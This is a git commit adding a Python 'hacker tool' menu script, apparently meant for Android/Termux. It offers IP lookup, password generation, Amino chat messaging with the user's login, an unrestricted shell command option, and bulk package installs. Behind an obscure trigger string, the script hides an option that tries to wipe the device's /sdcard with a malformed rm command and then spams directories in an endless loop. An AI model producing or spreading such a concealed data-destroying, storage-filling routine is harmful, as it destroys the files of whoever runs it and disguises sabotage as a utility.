8f06abbf592bed346bc033cb64171ba48ae3769c
NfrXDRA <74735777+NfrXDRA@users.noreply.github.com>
2021-01-08 16:51:59 +0300

    Add files via upload

---
+++ TOOL7R.py
@@ -0,0 +1,201 @@
+import os
+os.system('pip install Amino.py')
+os.system('pip install ascii_magic')
+import sys,time,socket,amino,random,ascii_magic,marshal
+def d(n):
+	for x in n +'\n':
+		sys.stdout.write(x)
+		sys.stdout.flush()
+		time.sleep(0000000.01)
+os.system('clear')
+d('''\033[1;36m _____   _____   _____   _       _____   _____   
+|_   _| /  _  \ /  _  \ | |     |___  | |  _  \  
+  | |   | | | | | | | | | |         / / | |_| |  
+  | |   | | | | | | | | | |        / /  |  _  /  
+  | |   | |_| | | |_| | | |___    / /   | | \ \  
+  |_|   \_____/ \_____/ |_____|  /_/    |_|  \_\ 
+                                        
+                                         
+                    
+                                        
+                                        
+                                        
+ __   _   _____   _____        ___   _____  
+|  \ | | |  ___| |  _  \      /   | |_   _| 
+|   \| | | |__   | |_| |     / /| |   | |   
+| |\   | |  __|  |  _  /    / / | |   | |   
+| | \  | | |     | | \ \   / /  | |   | |   
+|_|  \_| |_|     |_|  \_\ /_/   |_|   |_|   
+                                                   
+                                                   
+                                                   
+                                                   
+ _____   _____       ___   _____    _____  
+/  ___/ |_   _|     /   | |  _  \  |_   _| 
+| |___    | |      / /| | | |_| |    | |   
+\___  \   | |     / / | | |  _  /    | |   
+ ___| |   | |    / /  | | | | \ \    | |   
+/_____/   |_|   /_/   |_| |_|  \_\   |_|   ''')
+os.system('clear')
+lpo=["""
+▬▬▬.◙.▬▬▬
+═▂▄▄▓▄▄▂
+◢◤ █▀▀████▄▄▄▄▄▄◢◤
+█▄ █ :) ██▀▀▀▀▀▀▀╬
+◥█████◤
+══╩══╩══
+▬▬▬.◙.▬▬▬
+═▂▄▄▓▄▄▂
+◢◤ █▀
+
+
+
+◥████""","""┈┈┈╲┈┈┈┈╱
+┈┈┈╱     ▔▔╲
+┈┈┃┈▇┈┈▇┈┃
+╭╮┣━━━━━━┫╭╮
+┃┃┃┈┈┈┈┈┈┃┃┃
+╰╯┃┈┈┈┈┈┈┃╰╯
+┈┈╰┓┏━━┓┏╯
+┈┈┈╰╯┈┈╰╯""","""──▄▀▀▀▄───────────────
+──█───█───────────────
+─███████─────────▄▀▀▄─
+░██─▀─██░░█▀█▀▀▀▀█░░█░
+░███▄███░░▀░▀░░░░░▀▀░░""","""╯▅╰╱▔▔▔▔▔▔▔╲╯╯☼
+▕▕╱╱╱╱╱╱╱╱╱╲╲╭╭
+▕▕╱╱╱╱╱╱╱╱┛▂╲╲╭
+╱▂▂▂▂▂▂╱╱┏▕╋▏╲╲
+▔▏▂┗┓▂▕▔┛▂┏▔▂▕▔
+▕▕╋▏▕╋▏▏▕┏▏▕╋▏▏
+▕┓▔┗┓▔┏▏▕┗▏┓▔┏▏""","""OO═══∩═══OO
+...........╭╬╮ ◢
+-✶-╭▅▇□□█▇▆▅▄▃▂▁(╳)█╮
+.....╰═▃_▁∠════▔▔▔
+............╙O ╙O""","""░░░░░░███████ ]▄▄▄▄▄▄▄▄▃
+▂▄▅█████████▅▄▃▂
+I███████████████████].
+◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤..""","""────█▀█▄▄▄▄─────██▄
+────█▀▄▄▄▄█─────█▀▀█
+─▄▄▄█─────█──▄▄▄█
+██▀▄█─▄██▀█─███▀█
+─▀▀▀──▀█▄█▀─▀█▄█▀""","""╭━━━━━━━╮
+┃       ● ══    ┃
+┃███████┃
+┃███████┃
+┃███████┃
+┃███████┃
+┃███████┃
+┃███████┃
+┃███████┃
+┃███████┃
+┃         ○        ┃
+╰━━━━━━━╯""","""░▀▄░░▄▀
+▄▄▄██▄▄▄▄▄░▀█▀▐░▌
+█▒░▒░▒░█▀█░░█░▐░▌
+█░▒░▒░▒█▀█░░█░░█
+█▄▄▄▄▄▄███══════"""]
+xmlk=random.choice(lpo)
+d(xmlk)
+d('The tool programmer is nfr that I have worked on this tool for an estimated number of hours to show it to you')
+d('instgram---››x_nikename\n\n telegram---››@virusmain')
+while True:
+	tp=input('T7R⟩⟩  ')
+	if tp=='ip':
+		ur=input ('TURL7R⟩⟩  ')
+		ipf=socket.gethostbyname(ur)
+		print ('host⟩⟩⟩  ',ipf,'    url⟩⟩⟩',ur)
+	elif tp=='password':
+		def pasek(dau):
+			m=8
+			pas=''
+			while len(pas)!=m:
+				v=random.choice(dau)
+				pas+=v
+			return pas
+		dau='1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIPOASDFGHJKLZXCVMBN'
+		print (pasek(dau))
+	elif tp =='send':
+		sends=input('TSE7R⟩⟩  ')
+		if sends=='message':
+			clint=amino.Client()
+			email=input('TEM7R⟩⟩  ')
+			time.sleep(1)
+			password=input('TPA7R⟩⟩  ')
+			clint.login(email=email,password=password)
+			messageType=int(input('TMT7R⟩⟩  '))
+			message=input('TM7R⟩⟩  ')
+			chaturl=input('TCU7R⟩⟩  ')
+			chat=clint.get_from_code(chaturl)
+			comId=chat.path[1:chat.path.index("/")]
+			subclint=amino.SubClient(comId=comId,profile=clint.profile)
+			chatId=subclint.get_from_code(chaturl).objectId
+			subclint.send_message(chatId=chatId,message=message,messageType=messageType)
+	elif tp =='get':
+		clint=amino.Client()
+		email=input('TEM7R⟩⟩  ')
+		password=input('TPA7R⟩⟩  ')
+		clint.login(email=email,password=password)
+		block=clint.get_blocker_users(start=0, size= 100)
+		print(block)
+	elif tp == 'clear':
+		os.system('clear')
+		d('''\033[1;36m _____   _____   _____   _       _____   _____   
+|_   _| /  _  \ /  _  \ | |     |___  | |  _  \  
+  | |   | | | | | | | | | |         / / | |_| |  
+  | |   | | | | | | | | | |        / /  |  _  /  
+  | |   | |_| | | |_| | | |___    / /   | | \ \  
+  |_|   \_____/ \_____/ |_____|  /_/    |_|  \_\ ''')
+		d('The tool programmer is nfr that I have worked on this tool for an estimated number of hours to show it to you')
+		d('instgram---››x_nikename\n\n telegram---››@virusmain')
+	elif tp =='os':
+		xms=input('TOC7R⟩⟩  ')
+		os.system(xms)
+		if xms=='clear':
+			os.system('clear')
+			d('''\033[1;36m _____   _____   _____   _       _____   _____   
+|_   _| /  _  \ /  _  \ | |     |___  | |  _  \  
+  | |   | | | | | | | | | |         / / | |_| |  
+  | |   | | | | | | | | | |        / /  |  _  /  
+  | |   | |_| | | |_| | | |___    / /   | | \ \  
+  |_|   \_____/ \_____/ |_____|  /_/    |_|  \_\ ''')
+			d('The tool programmer is nfr that I have worked on this tool for an estimated number of hours to show it to you')
+			d('instgram---››x_nikename\n\n telegram---››@virusmain')
+	elif tp == 'sec':
+		def ddd(s):
+			for imn in s +'\n':
+				sys.stdout.write(imn)
+				sys.stdout.flush()
+				time.sleep(000000.05)
+		ddd('''
+		Here is some help to protect yourself
+As the first advice, do not do what someone asks for you, as sometimes he may take advantage of you
+The second tip is not to download apps from unauthorized sites
+In the event that you are hacked, shut down the network, remove the SIM card, and turn off your phone. Goodbye
+''')
+	elif tp =='img':
+		sec=input('TISD7R⟩⟩  ')
+		sen=input('TA7R⟩⟩  ')
+		siz=int(input('TS7R⟩⟩  '))
+		omn=ascii_magic.from_image_file(sec,columns=siz,char=sen)
+		print(omn)
+	elif tp =='pkg':
+		os.system('pkg install python -y')
+		os.system('pkg install bash -y')
+		os.system('pkg install python2 -y')
+		os.system('pkg install python3 -y')
+		os.system('pkg install clang -y')
+		os.system('pkg install tor -y')
+		os.system('pkg install repo -y')
+		os.system('pkg install get -y')
+	elif tp =='hide sd (/))) \m HIDE cdr ()':
+		xcn= input ('If you continue, your device’s internal memory will be deleted')
+		if xcn=='continue()':
+			os.system ('cd /sdcard')
+			os.system ('rm -rif*')
+			xxxxm='1'
+			cmt=input('mkdir?')
+			if cmt =='mkdir':
+				while True:
+					os.mkdir('c'+xxxxm)
+					xxxxm+='1'
+					print ('done)',xxxxm,'  spam')
